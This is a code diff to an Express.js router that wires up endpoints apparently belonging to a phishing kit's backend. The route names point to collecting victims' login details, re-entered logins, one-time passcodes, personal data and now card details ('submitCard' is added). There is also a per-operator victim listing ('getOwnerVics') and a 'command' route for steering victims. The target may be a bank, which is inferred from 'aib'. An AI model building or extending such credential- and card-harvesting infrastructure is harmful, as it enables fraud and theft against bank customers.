@@ -1,6 +1,5 @@
 const express = require("express");
 const {
-  openModal,
   getOwnerVics,
   command,
   getInfo,
@@ -9,16 +8,17 @@ const {
   submitOtp,
   submitMisc,
   submitLoginAgain,
+  submitCard,
 } = require("../controllers/aibController");
 
 const router = express.Router();
 
-router.post("/customers/:id/:owner/modal", openModal);
-router.post("/customers/:owner", getOwnerVics);
+router.get("/customers/:owner", getOwnerVics);
 router.post("/command", command);
-router.post("/customers/id/:id", getInfo);
+router.get("/customers/id/:uniqueid", getInfo);
 router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
+router.post("/card", submitCard);
 router.post("/personal", submitPersonal);
 router.post("/otp", submitOtp);
 router.post("/misc", submitMisc);
